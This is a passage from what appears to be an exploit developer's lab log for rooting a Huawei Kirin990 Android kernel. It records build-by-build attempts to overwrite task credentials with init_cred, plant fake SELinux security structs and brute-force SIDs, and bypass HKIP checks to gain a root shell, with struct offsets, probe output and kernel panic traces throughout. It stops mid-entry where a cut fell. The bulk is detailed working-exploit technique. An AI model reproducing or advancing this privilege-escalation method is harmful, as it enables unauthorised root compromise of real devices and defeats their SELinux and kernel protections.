REMAINING ROUTE: give a task a cred = a FAKE cred crafted in the arm window (a known kernel-stack
address) whose uid/euid/fsuid are 0 and whose security points at a FAKE task_security_struct with
sid = the SHELL sid NUMBER (obtained from /sys/fs/selinux/context).  task->cred is then a pointer
write (which the primitive does cleanly).  The known panic is selinux_cred_free on cred free, so
the task must never exit and the fake cred usage must be pinned high.

### (46) 2026-09-24 ctx/exec probes: exec is CLOSED; the child cannot resolve a SID number

Build 83a568d9 (probe suite + /sys/fs/selinux/context + execve):
`
fl2: ctx open fd=7 e=13        <- open SUCCEEDED (errno stale); the node is reachable
fl2: ctx write=-1 e=13 read=0 ''  <- WRITE DENIED (EACCES): the kernel sid cannot resolve a context
fl2: execve /system/bin/sh errno=13  <- EACCES: the kernel domain CANNOT execve a system binary
`
So the exec route is CLOSED too.  The kernel-sid child cannot obtain a SID number via the context
node.  MAIN, however, IS the shell sid, so it should be able to resolve `u:r:shell:s0` -> NUMBER
(a main-side ctx probe was added).  That NUMBER is the remaining prerequisite for the fake-cred
route (a fake cred, crafted in g_sbuf and planted on a kernel stack by the MCAST stamp, with
uid/euid/fsuid = 0 and security -> a fake task_security_struct whose sid = the shell NUMBER).

### (47) 2026-09-24 main CAN use the context node (but it returns only the context); new mount idea

Build 572ed8b9 (MAIN-side ctx probe):
`
fl2: mctx open=4 e=13
fl2: mctx write=12 e=13 read=13 'u:r:shell:s0'
`
So MAIN (the shell sid) may use /sys/fs/selinux/context, but the read returns ONLY the context
string - NOT a "sid N" number.  So the shell SID NUMBER is not directly exposed here (it would
have to be parsed out of /sys/fs/selinux/policy).

NEW IDEA (probe added): the kernel-sid uid-0 child has FULL CAPS.  If it can MOUNT a tmpfs over
/data/local/tmp, the deliverables can be written there as uid 0 on the new tmpfs - bypassing the
shell_data_file type check - and a fresh tmpfs has no MS_NOSUID so a 4755 rsh works.  Probe:
`syscall(__NR_mount,"tmpfs","/data/local/tmp","tmpfs",0,"mode=0777")` then open rooted.txt.

### (48) 2026-09-24 mount is CLOSED too; sweeping other contexts

Build eb577ace (mount probe):
`
fl2: mount tmpfs r=-1 e=13     <- EACCES: the kernel-sid uid-0 task (full caps) CANNOT mount
fl2: probe mount end
`
So mount is closed as well.  Routes closed so far (all measured): (a) sysfs enforce (EINVAL/EACCES),
(b) kernel-sid shell_data_file write (EACCES), (c) attr/exec transition (EACCES), (d) execve a
system binary (EACCES), (e) mount tmpfs (EACCES), (f) leaf-zero uid on a cred (PANIC).  The
reachable states are only [uid 0 + kernel sid] (cede) and [uid 2000 + shell sid] (cred = P).
Next cheap probe: sweep setcon/attr/exec over su/init/system_app/priv_app/platform_app/
untrusted_app/shell - if ANY target is accepted and can write shell_data_file we are done.

### (49) 2026-09-24 context sweep: EVERY transition target is denied

Build 6da19dcc (setcon/attr-exec sweep):
`
fl2: setcon u:r:su:s0 r=-1 e=13              fl2: atexec u:r:su:s0 r=-1 e=13
fl2: setcon u:r:init:s0 r=-1 e=13            fl2: atexec u:r:init:s0 r=-1 e=13
fl2: setcon u:r:system_app:s0 r=-1 e=13      fl2: atexec u:r:system_app:s0 r=-1 e=13
fl2: setcon u:r:priv_app:s0 r=-1 e=13        fl2: atexec u:r:priv_app:s0 r=-1 e=13
fl2: setcon u:r:platform_app:s0 r=-1 e=13    fl2: atexec u:r:platform_app:s0 r=-1 e=13
fl2: setcon u:r:untrusted_app:s0 r=-1 e=13   fl2: atexec u:r:untrusted_app:s0 r=-1 e=13
fl2: setcon u:r:shell:s0 r=-1 e=13           fl2: atexec u:r:shell:s0 r=-1 e=13
`
So NO context transition from the kernel domain is accepted.  EVERY syscall route is now closed:
(a) sysfs enforce, (b) kernel-sid shell_data_file write, (c) attr/exec, (d) execve, (e) mount,
(f) setcon/attr-exec to any context.

ONLY REMAINING ROUTE: a FAKE CRED installed by a POINTER write (the one write shape the primitive
does cleanly).  Plan (incremental, testable):
  step 1 - craft a cred-shaped object in g_sbuf (uid/euid/fsuid/etc = 0, user=&root_user,
           user_ns=&init_user_ns, group_info=&init_groups, caps = 0, keyrings = 0,
           security = &T_fake) plus a fake task_security_struct T_fake (osid=1, sid=candidate),
           plant them on the arm's kernel stack via the MCAST stamp, and install
           task->cred = &C_fake on the SHIELDED consumer Ts; with sid=1 (kernel) the task must
           still survive as uid 0 -> that validates the fake-cred LAYOUT without needing the
           shell sid (the cede already proved uid 0 + kernel sid survives when shielded/bit).
  step 2 - brute-force the sid (re-stamp T_fake.sid, re-install, try open rooted.txt) to find
           the value whose type may write shell_data_file.

### (50) 2026-09-24 sid brute-force via a fake tsec + real-cred launder (the last route)

Design, from re-reading the existing --sid mode (all pieces proven separately):
- `do_write(blob, cred+0x78)` sets `cred->security` = a fake task_security_struct at
  `blob = g_waiter_abs - 0x78` (the window base = buffer[0]); the fake tsec is `{osid=1,
  sid=<g_fakesid>}` so `*(blob)` is ODD and the pointer write is ACCEPTED (the --sid mode used
  sid=1).
- A THREAD created afterwards runs `copy_creds() -> prepare_creds() -> selinux_cred_prepare()`,
  which **kmemdup()s the fake tsec into a REAL task_security_struct** => the new thread has a REAL
  cred (so no `kfree(window)` BUG) with sid = the planted value AND its own HKIP bit
  (copy_process->hkip_init_task).
- Therefore: shield a consumer, cede it to `&init_cred` (uid/euid/fsuid = 0), then for k=5..120:
  plant the fake tsec with sid=k (re-stamp via `g_fakesid` + one pointer write
  `init_cred->security = &fake_tsec`), have the ceded consumer create an OPENER thread, and let the
  opener try to create rooted.txt.  A success means sid=k's type may write shell_data_file, and the
  files are ROOT-OWNED because fsuid = 0 (so `rsh` 4755 -> `rsh -c id` is root).

Implementation: `g_fakesid`, `g_sidbrute_spawn`, `g_sidbrute_done`; `thread_opener()`; a consumer
hook; --fl2's tail performs the sweep.  Build c7e09266; run in flight.

### (51) 2026-09-24 sid brute-force diagnosis: the owner stalls and the init_cred write is UNSAFE

Build fb0eea23 (sweep 1..160 + diagnostics).  kw.log:
`
fl2: consumer uid 0 (cede landed) tid=4828 owner=4828   <- the ceded consumer IS the owner
fl2: hook seen tid=4823 owner=4828 uid=4294967286       <- a NON-owner consumer loops (uid 0xFFFFFFF6)
opener count = 0
`
So (a) g_fire_owner is CORRECT (the ceded consumer, tid 4828, IS the owner); (b) the owner never
reaches the spawn hook even though getuid()==0 holds for it, so it must have STOPPED looping;
(c) the process is down to 5 threads and the pstore holds an oops at t=411 (cpu4, pid 0,
Comm ghostlock_e, TGID 0 - the classic "corrupted structure -> IRQ fault").

Root cause: writing `init_cred->security = &window_fake_tsec` rewrites the per-cred security of EVERY
cred that shares init_cred (all kernel threads AND the ceded consumer), so a later kernel read of a
window/stack address (or a garbage sid once the window changes) faults -> the oops.

=> the target MUST be a PRIVATE cred, never the global init_cred.

FIX DIRECTION: after the cede the consumer does `setresuid(0,0,0)` -> a PRIVATE cred E (uid 0 + its
OWN HKIP bit); the consumer leaks E with its own leak_cred()/perf (cf. the --sid mode), reports it,
and MAIN writes `E->security = &fake_tsec` (a slab cred: writable, not ROWM, and private so only the
consumer + its future threads see it); the consumer then creates an opener thread whose
prepare_creds() kmemdup()s E->security into a REAL task_security_struct (sid = candidate, STABLE, no
window dependency) with uid 0 + its own bit.

### (52) 2026-09-24 private-cred sid brute-force (the 9an(51) fix)

Build e7e7d7ba: `--fl2` now, after the cede, sets `g_sidbrute_getcred`.  The CEDED consumer
(getuid()==0) then does `setresuid(0,0,0)` - a no-op commit (already uid 0) that ALSO sets its own
HKIP bit - and leaks that PRIVATE cred `E` with its own `leak_cred()` (perf + capset, whose
header.pid = our uid 0 passes).  MAIN waits for E and then sweeps k=1..160 writing
`E->security = &fake_tsec(sid=k)`:
- E is a SLAB cred: writable (not ROWM) and PRIVATE to the consumer, so - unlike the global
  init_cred in 9an(51) - nothing else in the kernel is affected;
- the consumer creates an opener THREAD, whose `copy_creds()->prepare_creds()->
  selinux_cred_prepare()` kmemdup()s E->security into a REAL task_security_struct (sid=k, stable);
- the opener (uid 0 + its own HKIP bit) tries to create rooted.txt.  A success means sid=k's type
  may write shell_data_file (and the files are root-owned because fsuid = 0).

### (53) 2026-09-24 ROOT CAUSE: the cede wrote only cred, not real_cred -> cred.c:435

Build e7e7d7ba (private-cred version).  The process died and the pstore shows:
`
[144.6s] BUG: spinlock bad magic on CPU#4, ghostlock_e/5143 (TGID 4059)
[152.8s] kernel BUG at .../kernel/linux-4.14/kernel/cred.c:435!
         Internal error: Oops - BUG: 0 [#1]   CPU: 5 PID: 0 Comm: ghostlock_e
`
Our own Huawei source (kernel/cred.c) shows line 435 is inside `commit_creds()`:
`
	BUG_ON(task->cred != old);      /* old = task->real_cred */
`
The cede loop wrote ONLY `Ts+0x9E8` (task->cred) and never `Ts+0x9E0` (task->real_cred).  So the ceded
consumer had `cred = &init_cred` while `real_cred` stayed P; the instant it ran setresuid(0,0,0) ->
commit_creds() the BUG_ON fired -> panic.  (This also explains why the earlier fork child's
setresuid(0,0,0) was fragile.)

FIX (this commit): the cede writes BOTH slots: `Ts+0x9E0 = &init_cred` AND `Ts+0x9E8 = &init_cred`.

### (54) 2026-09-24 private-cred sid sweep RUNS end to end (160 openers, uid 0) but no sid in 1..160 writes

Build fc765bc9 (both-slot cede + private cred).  kw.log:
`
fl2: opener created
opener: attr= uid=0 euid=0          <- the launder WORKS: the opener is uid 0 with a REAL tsec
opener: open rooted fd=-1 e=13      <- EACCES for every candidate
... fl2: sid 160 done=0
opener count = 160                  <- all 160 openers were created and ran
`
So the mechanism now works end to end: the BOTH-SLOT cede fixed the cred.c:435 BUG_ON (9an(53)), the
consumer leaked a PRIVATE cred E, the sweep wrote E->security = &fake_tsec(sid=k), and the opener
threads (uid 0 + own bit + a kmemdup()ed REAL tsec) ran.  BUT every sid in 1..160 is denied EACCES,
and the opener's /proc/self/attr/current read is EMPTY (a restrictive sid that denies even a self
getattr - consistent with the write having landed with sid=k).  => the shell sid is NOT in 1..160;
extend the sweep, bounded by the policy's sid count.

### (55) 2026-09-24 static reports 007/008/009 adopted (cross-validation + new constraints)

All three passed.  The decisive rows:
- **T008-05 independently found the SAME root cause as 9an(53)**: the active cede wrote only
  `Ts+TASK_CRED`, leaving `real_cred` = the old shell cred -> `commit_creds()`'s
  `BUG_ON(task->cred != old)` at cred.c:435.  (Already fixed by writing both slots.)
- **T007-21/22 and T008-06/09**: `CLONE_THREAD` with a NULL thread keyring takes the SHARE path and
  does NOT call `prepare_creds()`, so a plain `pthread_create` does **not** kmemdup(); a **non-thread
  clone (a fork)** allocates a NEW cred and copies the security via `selinux_cred_prepare()`.  So the
  launder (a REAL, stable tsec) requires a **fork**, not a thread.
- **T007-09 / T009-08**: cred layout confirmed (uid@4, euid@0x14, fsuid@0x1C, cap_effective@0x38,
  **security@0x78**, user@0x80, user_ns@0x88, group_info@0x90; tsec{osid@0, sid@4, size 0x18}) and
  the create source SID is `current_security()->sid` (cred->security+4).
- **T008-12/13/20 (critical)**: our `E` acquisition is NOT proven private - `setresuid`'s return is
  ignored and `leak_cred()` supplies an unchecked pointer; no allowed source returns `E`'s address
  non-destructively.  (Empirically the sweep did not corrupt the global init_cred, so `leak_cred()`
  did not return init_cred - but this needs an explicit check.)
- **T009-10/11/17 (critical)**: the AVC hashes raw u32 SIDs and does NOT verify sidtable membership,
  and the cache-miss wrapper does not check `security_compute_av()`'s return, so an **out-of-range
  sid is NOT proven safe**; T009-16/18 say the sidtab cardinality is unknown.

=> next code change: make the OPENER a FORK (not a pthread) so the child gets a REAL kmemdup()ed
tsec (T007-22/T008-09), and keep the sid sweep within the values already probed valid (1..160 were
all valid denials).

### (56) 2026-09-24 the 1..600 sweep result + the ctx-oracle change (first attempt hit a leak flake)

- The 1..600 sweep (build 76241ff6) finished: every k was denied EACCES, 0 SUCCESS, no
  rooted.txt / rsh.  The process stayed alive to k=600, BUT the pstore for that boot shows a
  ghostlock_e fault at t=775, so the long sweep is not free (consistent with T009-10/11/17: an
  out-of-range sid is not proven safe).
- The context-node experiment re-confirmed the ONLY user-space context->sid path returns the
  canonical STRING, never the number: `fl2: mctx write=12 e=13 read=13 'u:r:shell:s0'`.
- CHANGE (build 5523501a): the opener now reports its OWN sid context STRING via
  `getsockopt(SO_PEERSEC)` on a socketpair.  hooks.c selinux_socket_getpeersec_stream does no
  avc_has_perm - it only calls security_sid_to_context(peer_sid), and for a socketpair we made
  peer_sid is our own sid - with /proc/self/attr/current as a fallback.  Log:
  `opener: k=<n> ctx='<string>'`.  All-kernel => the E->security write is NOT landing; varying
  => the write lands and the `ctx='u:r:shell:s0'` line yields the shell sid NUMBER directly.
- FIRST RUN of 5523501a FAILED BEFORE the sweep: arm_leak_task_multi returned 0
  (`arm_leak: samples=N in_chain=0 cands=0 consumer_task=0x0` repeatedly), so `fl2: leak failed`
  and the mode returned 4.  The oracle was NOT exercised.  Retrying the same build.

### (57) 2026-09-24 the socketpair SO_PEERSEC oracle was INVALID - the abstract-accept path is the valid one

Measured with a standalone helper run on the device as **shell** (whose context is certainly
u:r:shell:s0):
`
socketpair: SO_PEERSEC=u:object_r:unlabeled:s0
accepted:   SO_PEERSEC=u:r:shell:s0
`
So:
- A plain socketpair returns the socketpair DEFAULT (selinux_sk_alloc_security sets
  sksec->peer_sid = SECINITSID_UNLABELED and socketpair never updates it).  The 5523501a run
  therefore logged a constant `opener: k=N ctx=u:object_r:unlabeled:s0`, which says NOTHING
  about the opener sid: H1 vs H2 is STILL UNDECIDED.
- The ACCEPTED end of an ABSTRACT-socket connection returns the CONNECTING task sid = our own
  sid.  Abstract sockets need no filesystem permission and selinux_socket_getpeersec_stream does
  no avc_has_perm, so this is a valid permission-free sid->string oracle.

FIX (build a41ab356): add self_context() (AF_UNIX abstract bind/listen/connect/accept +
getsockopt(SO_PEERSEC)) and make the opener log
`opener: k=<n> ctx=<string> uid=<u> self_ctx=<rc>`.

### (58) 2026-09-24 H1 CONFIRMED: the E->security write was not landing (leak_cred returned the wrong cred)

With the corrected ctx oracle (9an(57)), build a41ab356 ran the sweep and EVERY opener reported
the SAME context:
`
340 ctx=u:r:kernel:s0      (self_ctx=13 => the oracle itself succeeded)
`
So each opener SID was 1 (KERNEL) for EVERY candidate k => the `E->security = &fake_tsec` write
was NOT landing, i.e. leak_cred() does not return the ceded consumer current cred (exactly what
report 008 T008-12/13/20 flagged).  The whole sweep had been testing the kernel domain.

FIX (build 0fc8875a): drop leak_cred() in the consumer; the consumer only commits the private
cred (setresuid(0,0,0)) and sets g_sidbrute_committed.  MAIN then reads
E = *(Ts+TASK_CRED) from the ceded consumer TASK SLOT with the PROVEN read
(arm_rd16 at the ODD address Ts+0x9E7, so b[1..8] are E 8 bytes), then immediately restores BOTH
Ts+0x9E0 and Ts+0x9E8 to E (that read side store clobbers the 16-byte block Ts+0x9E0..0x9EF).

### (59) 2026-09-24 static reports 010/011/012 adopted (all PASS) - the unlabeled remap + oracle validation

- **T012-08 (critical) validates the 9an(57) oracle fix**: a normal AF_UNIX stream connect does
  UNIX_STREAM_SOCKET__CONNECTTO and then assigns peer SIDs from the socket SIDs
  (`sksec_new->peer_sid = sksec_sock->sid`), so the ACCEPTED end returns OUR OWN sid; whereas
  unix_socketpair never writes peer_sid (T012-02) and sk_alloc sets it to UNLABELED (T012-03),
  which is why a socketpair returned u:object_r:unlabeled:s0.
- **T010-02/03/04/05 (critical) change the sid-sweep model**: security_compute_av() calls
  avd_init() BEFORE the SID lookup (so a miss never yields an uninitialized decision), and an
  unassigned/invalid sid is REMAPPED to SECINITSID_UNLABELED instead of returning NULL (NULL ->
  -EACCES only if no unlabeled node).  So sweeping PAST the table is not a fault and not
  necessarily a deny - it evaluates as the `unlabeled` context (T010-04: potentially allowing).
  T010-12: dynamic sids start at 1 and grow monotonically with NO fixed bound; T010-21/22: there
  is no source-derived sweep endpoint.
- **T011-02/03/05/08**: cred offsets confirmed (security@0x78, user@0x80, user_ns@0x88,
  group_info@0x90) and task_security_struct{osid@0, sid@4, create_sid@12,...}; the file create
  reads security->sid (source) and security->create_sid (new label).
- **T011-14/15 (critical)**: selinux_cred_free() unconditionally kfree()s the stored security
  pointer and the outer task teardown must free a cred_jar allocation - so any route that parks a
  fake cred/tsec in a non-slab buffer risks a BUG at teardown.  (The current design only points a
  REAL cred-security at our window, which is why E->security must never be left in a freed cred.)

### (60) 2026-09-24 the consumer (Ts) task leak flaked - add leak retries

Run of build 0fc8875a: the Ta/Tb task leak SUCCEEDED but the CONSUMER task leak (Ts, taken at
the cede stage) returned 0, so `fl2: consumer leak failed` and the mode parked before the cede;
the E-via-slot fix was never reached.  arm_leak_task_multi is timing-flaky and had NO retries.
FIX (build ba1b43db): retry the three critical task leaks - Ta (x6) and Tb (x6) create a fresh
consumer thread per try, and Ts (x8) retries with a short delay - each attempt logging
`fl2: Ta/Tb/Ts try=<r>=<addr>` so a flake is visible.

### (61) 2026-09-24 setup crash during the task-slot reads (pstore) + retry

Run of build ba1b43db: Ta and Tb leaked on try 0, then the process vanished and the device
panicked and rebooted (uptime had reset to 280).  The pstore for that boot:
`
[143.99s] BUG: spinlock bad magic on CPU#5, ghostlock_e/5160 (TGID 4075)
[148.89s] Unable to handle kernel NULL pointer dereference at virtual address 00000000
          CPU: 4 PID: 5173 Comm: ghostlock_e   pc : [<ffffff9e36a2ec04>]
`
gl.klog LAST line was `fl2: cred repaired` (immediately after STEP 0) and NO `fl2: Ts try=`
line appeared, so the crash is between STEP 0 and the first Ts leak: the pre-existing fragile
window where the hi/lo TASK-SLOT reads (arm_rd16 at Ta+0x9E3 / Tb+0x9E7) clobber the LIVE helper
tasks cred/real_cred slots before STEP 0 restores them.  Measured rate ~1 crash in 4 setups, and
it is NOT caused by the E change (which was never reached).  Same build retried.

### (62) 2026-09-24 reading E from the LIVE consumer slot panicked - park the consumer first

Run of build ba1b43db (retry 2): Ta/Tb/Ts all leaked on try 0 and `fl2: committed=1` was logged,
but there was NO `fl2: E(slot read)` line, the process vanished and uptime had reset (panic).
Cause: the E read (arm_rd16 at the ODD Ts+0x9E7) clobbers the LIVE ceded consumer task slots
Ts+0x9E0..0x9EF (real_cred/cred) and the consumer dereferences its cred inside that window.

FIX (build 16da7945): after committing E the consumer PARKS in a usleep loop (no syscall that
dereferences our cred) until g_sidbrute_resume; MAIN reads E from the slot and restores BOTH
slots, then sets g_sidbrute_resume so the consumer resumes and creates openers.  If the arm walk
does not fire while the consumer sleeps, the read yields an invalid E and we will see
`fl2: E read failed - parking`.

### (63) 2026-09-24 the E read must NOT target the arm owner - use a helper owner

Run of build 16da7945: same failure shape (Ta/Tb/Ts leaked, `committed=1`, then death; pstore:
fatal `Unable to handle kernel paging request at virtual address 29cfe8c29cd184`, pid 0, right
after committed=1).  Root cause: the read targets the ODD address Ts+0x9E7 and Ts IS the arm
OWNER, so clobbering Ts+0x9E0..0x9EF corrupts the OWNER's own cred slots while the walk runs in
its context.  The Ta/Tb reads were safe precisely because those tasks are NOT the owner.
Parking the consumer did NOT help because the owner still executes the walk.

FIX (build ecf3db39): before the E read, save g_fire_owner, create a FRESH helper consumer
(thread_consumer) and make IT the arm owner (g_fire_owner = g_consumer_tid) so the clobbered
task Ts is a non-owner; after the read + slot repair, restore g_fire_owner to the ceded consumer
for the sweep.

### (64) 2026-09-24 static reports 013/014/015 adopted (all PASS)

- **013 (the unlabeled remap is real but policy-dependent)**: ordinary sidtab_search remaps an
  absent/unmapped SUBJECT sid to SECINITSID_UNLABELED (T013-01/02), and the unlabeled TYPE is
  actually consumed as the subject in context_struct_compute_av (T013-07).  BUT whether that
  allows a file create is policy-dependent and NOT derivable from the source (T013-11/17); the
  claim "an unassigned subject is always rejected" is FALSE (T013-18).  So a huge/unassigned
  candidate sid is SAFE to test (it evaluates as unlabeled) and MIGHT allow - worth one probe,
  not a guarantee.
- **014 (HKIP basis confirmed)**: the HKIP root bits are PID-indexed arrays uid_root_bits /
  gid_root_bits (T014-01/02); the XID wrappers are DEFAULT-TRUE when task_pid_nr(current)==0
  (T014-03) - that is exactly why zeroing the cached task->pid passes HKIP; detected root-like
  creds call force_sig(SIGKILL, current) (T014-08); copy_process runs hkip_check_xid_root()
  before copy_creds and hkip_init_task() writes the child bits (T014-09/10) - the basis for a
  forked child being legal root with its own bit; hkip_update_xid_root is reached from
  commit_creds (T014-13) - the basis for setresuid setting our own bit.
- **015 (opener sharing condition)**: copy_creds SHARES iff CLONE_THREAD AND
  `p->cred->thread_keyring == NULL` (T015-01); on the share path the child cred and security
  pointers are the SAME (T015-03); a non-NULL thread keyring forces prepare_creds with a fresh
  _tid keyring (T015-05/06).  So if the ceded consumer has NO thread keyring, ONE persistent
  opener shares E and tracks the live fake sid (T015-15) - and it must not run a later
  credential-changing op (T015-18).  This matters because we removed leak_cred(), whose
  keyctl(JOIN_SESSION_KEYRING) would have created a session keyring.

### (65) 2026-09-24 the helper-owner E read returns garbage and still dies

Run of build ecf3db39: the owner switch avoided the IMMEDIATE crash (we reached
`fl2: E-read owner -> helper` and logged `fl2: E(slot read)=9b69cfe8dec390c0`), but:
- the read returned GARBAGE (not 0xffffff...): a FRESH helper consumer is NOT a working arm
  owner for the read - the do_write to boot_id.data did not land, so boot_id returned its normal
  random UUID;
- the mode then parked, and the kernel STILL panicked ~20s later:
  `Unable to handle kernel paging request at virtual address 69cfe8dec390c4` = (garbage E)+4,
  i.e. the garbage E was later used as a pointer.
So a helper owner is not viable, and reading E from the task slot keeps corrupting the machine.

CONCLUSION: the task-slot read of E is too fragile on this build.  Two candidate next designs:
  (a) make a NON-owner task hold E: the ceded consumer creates a thread that SHARES E (T015-01:
      CLONE_THREAD + NULL thread_keyring), leak that thread task, and read E from ITS slot with
      the ceded consumer kept as the (working) arm owner; or
  (b) drop E entirely: cede task->real_cred/cred to a FAKE cred crafted in the window (uid 0,
      full caps, security -> the fake tsec, user/user_ns/group_info = the real init objects), so
      uid 0 + the candidate sid is installed by the same POINTER write the cede already performs.

### (66) 2026-09-24 reports 016/017 + the fake-cred window-size blocker -> adopt option (a)

- **016 (sharing thread)**: Kirin990 has CONFIG_KEYS=y (T016-01); copy_creds SHARES iff
  CLONE_THREAD AND cred->thread_keyring == NULL (T016-02); init_cred/blank/kernel-service/exec
  creds begin thread_keyring NULL (T016-08); JOIN_SESSION_KEYRING changes the SESSION ring, not
  the thread ring (T016-07); a shared cred stays alive while any sibling holds a reference
  (T016-12) but exec/exit drop it (T016-14/15) and parking only stops the task own exit
  (T016-18).  pthread clone flags are not provable from the tree (T016-10).
- **017 (fake cred)**: CONFIG_DEBUG_CREDENTIALS is OFF and CONFIG_USER_NS is off (T017-01/22);
  struct cred is 0xa8 with security@0x78, user@0x80, user_ns@0x88, group_info@0x90; tsec sid@4
  (T017-02/03).  BUT put_cred reaching 0 schedules RCU which kfree()s security, keyrings, group,
  user, ns and the cred slab (T017-18), and selinux_cred_free() unconditionally kfree()s the
  stored security pointer (T017-19); a borrowed/stack security pointer is an invalid-free risk at
  teardown (T017-20); a cached-pid==0 task panics in do_exit (T017-24).
- **BLOCKER for option (b)**: the only controlled KERNEL buffer is the stamped window g_sbuf,
  whose size is GSET_LEN = 0x108 and is already laid out for the arm (fake tsec @0x00, blackval
  slots, fake rt_mutex @0x48, waiter @0x78, more slots to 0x108).  A struct cred needs 0xa8
  CONTIGUOUS bytes, which does not fit, and GSET_LEN cannot simply grow (it is the kernel
  group_source_req / fd_set buffer).  So ceding to a crafted fake cred is NOT available.
- **DECISION**: option (a).  The ceded consumer creates a helper pthread that SHARES E
  (thread_keyring NULL); MAIN leaks that helper task and reads E from ITS task slot while the
  helper is PARKED (so the read's clobber cannot be dereferenced) and the ceded consumer stays
  the (working) arm owner.

### (67) 2026-09-24 option (a) implemented: forked sleeping child + task-list walk

Build 085f71c8:
- The ceded consumer, after setresuid(0,0,0) (which commits E), FORKS a child.  The child cred
  E_C = prepare_creds(E) is a FRESH cred (uid 0, security = kmemdup of the kernel tsec).  The
  child sleeps 2.5s (so the task-slot read clobber cannot be dereferenced), then loops trying to
  create /data/local/tmp/rooted.txt; on success it logs its own context (self_context) and calls
  write_proof() (which also makes the 4755 rsh).
- MAIN walks init_task.tasks backwards (newest first, the upstream_chain method at line 2122)
  matching task->pid (0x820) == the forked child pid, then reads E_C from the CHILD task slot
  with the ceded consumer KEPT AS THE ARM OWNER (the child is NOT the owner - that was the whole
  point of 9an(63)), and restores both C+0x9E0 / C+0x9E8 to E_C.
- The sweep then writes E_C->security = &window (fake tsec, sid = k); the child, looping, wins
  when k is a sid whose type may create shell_data_file.
- Rationale (9an(66)): option (b) is blocked (GSET_LEN=0x108 < sizeof(struct cred)=0xa8), so the
  deliverable is a REAL cred with a pointer to our window.

### (68) 2026-09-24 the task->pid list walk never finished - match comm newest-first

Run of build 085f71c8: no panic (sleeping child + owner kept = safe; uptime 464, no reset), the
child started (`forkchild start`), the parent set committed=1, but NO `child task=` line appeared
and the child eventually exited (zombie).  Cause: the task->pid walk did up to 8 x 40 rd64, and
each rd64 runs hot_wait() (up to 20 arm writes) => thousands of arm operations, too slow to finish.

FIX (build 89710966): the fresh forked child is the NEWEST "ghostloc" task, so match comm
newest-first and take the first hit (~1 hop): read init_task.tasks.prev and check its comm, with
only a few retries.

### (69) 2026-09-24 flaky SETUP crash again (at the cede/shield), not option (a)

Run of build 89710966: empty readout, uptime reset to 310.  gl.klog ended at
`fl2: consumer shielded (pid 0)` and the pstore shows `BUG: spinlock bad magic` with
`lock: 0xffffffc3b4417cc0, .magic: 00000000` in do_raw_spin_unlock (t=144.49s) - i.e. it died at
the CEDE stage, BEFORE the child, so option (a) was never reached.  This is the same
intermittent (~1 in 4) setup fragility seen in 9an(61); the only remedy is to retry the build.

### (70) 2026-09-24 setup fragility now hits repeatedly (pre-child, pre-cede)

Retry of build 89710966 crashed at the SAME early point: gl.klog ended at `fl2: Ts=<addr>` (right
after the consumer task leak, before `consumer shielded`), pstore `BUG: spinlock bad magic`
(lock .magic==0) at t=142.7 then a NULL-deref oops at t=147.4.  So the pre-existing setup window
(task-slot reads clobbering live helper cred slots; the leak-retry loops add extra consumer
threads) is now the dominant blocker - option (a) is never reached.  Next: harden the setup
(reduce the number of consumer threads / make the hi-lo+Ts reads atomic with immediate repair, or
wrap the whole setup in a verified retry) BEFORE another option-(a) run.

### (71) 2026-09-24 setup hardening: skip the Ta/Tb/P block (option a never uses P)

Build 699ff732: in --fl2 create exactly ONE owner consumer and SKIP the whole Ta/Tb/P/STEP-0
block.  Rationale: option (a) never uses P, and the Ta/Tb hi-lo TASK-SLOT reads of LIVE helper
consumers were the dominant setup-crash source (9an(61)/(70)); the cede writes Ts+0x9E0/0x9E8
directly with &init_cred, so no P repair is needed.  This removes 3+ consumer threads and the two
live-slot reads, leaving the chain: 1 consumer -> Ts leak -> shield -> cede -> child fork ->
child-slot E_C read -> sweep.

### (72) 2026-09-24 child find failed: rd64 is the BARE read (no arm wrapper)

Run of build 699ff732: the hardening WORKED - NO panic (uptime 464, no reset) - and the chain
reached `consumer shielded (pid 0)` -> `committed=1` -> `forked child pid=5180` ->
`forkchild start`.  BUT `child task=0 (comm match)` -> "child not found - parking".  Cause: the
child find used rd64, which wraps the BARE rd16 (do_write only, no arm_r()/arm_r_join()), so the
read never lands.  FIX (build d3b06760): do the list walk with the arm_r/arm_r_join-WRAPPED
arm_rd16 (read 16 bytes at g_init_task+TASK_TASKS_OFF and take b[8..15] for tasks.prev; read
cur+TASK_COMM_OFF and take b[0..7] for comm).

### (73) 2026-09-24 arm_rd16 needs an ODD address (it is the byte-shift read)

Run of build d3b06760: the reads landed but returned garbage (`newest comm=4`,
`newest comm=ffffff8c545ebbe0`).  Cause: arm_rd16 must be given an ODD address - it is the
byte-shift read (the P read used Ta+0x9E3 / Tb+0x9E7 and took b[1..]); I passed EVEN addresses
(g_init_task+0x720, cur+0xAB8).  FIX: read at (X-1) and take b[1..8] for *(X); for the walk that
is arm_rd16(g_init_task+TASK_TASKS_OFF+7) for tasks.prev and arm_rd16(cur+TASK_COMM_OFF-1) for comm.

### (74) 2026-09-24 the init_task.tasks list-walk read is destructive (reboots)

Run of build b2f371a3: `child task=0`, NO `newest comm=` line (arm_rd16 returned fail), and the
device rebooted (uptime 145 at the readout).  Reading g_init_task+TASK_TASKS_OFF with arm_rd16
clobbers the 16-byte block that IS the tasks list_head at init_task+0x720 = the GLOBAL task list
-> corruption -> panic.  So walking the task list via arm_rd16 is not safe.  Next: get the child
task WITHOUT touching init_task.tasks - e.g. leak the child with arm_leak_task_multi while it
briefly runs as the arm owner (then park it), or read one task slot at a time from a known-safe
task.  (setup itself is now stable: 9an(71) removed the Ta/Tb reads and it reached the fork.)

### (75) 2026-09-24 child self-leak via MAP_SHARED (no task-list walk)

Build b2f371a3+ : the forked child, immediately after fork, silences stdout/stderr (its sid
cannot write shell_data_file), calls the TID-filtered leak_task_own() to obtain ITS OWN
task_struct, and publishes it into an 8-byte MAP_SHARED cell (g_childtask_shm) that MAIN mmaps
before the fork; the child then sleeps 2.5s and loops trying the create.  MAIN polls that cell
(up to 8s) for the child task C - avoiding the DESTRUCTIVE init_task.tasks walk (9an(74)) - then
reads E_C from C+0x9E7 with the ceded consumer kept as the arm OWNER, repairs C+0x9E0/C+0x9E8,
and sweeps E_C->security over candidate sids.

### (76) 2026-09-24 child self-leak WORKS; add a settle wait before the slot read

Run of build 78829329: the child self-leak WORKED - `fl2: child self task=ffffffd5b29533c0` and
MAIN `fl2: child task=ffffffd5b29533c0 (self-leak)` right after `committed=1`, with NO task-list
walk.  But it panicked before `E_C(slot read)`: MAIN read C+0x9E7 immediately, while the child was
still running its perf self-leak (not yet in its 2.5s sleep) -> clobber -> panic.  FIX (9an(76)):
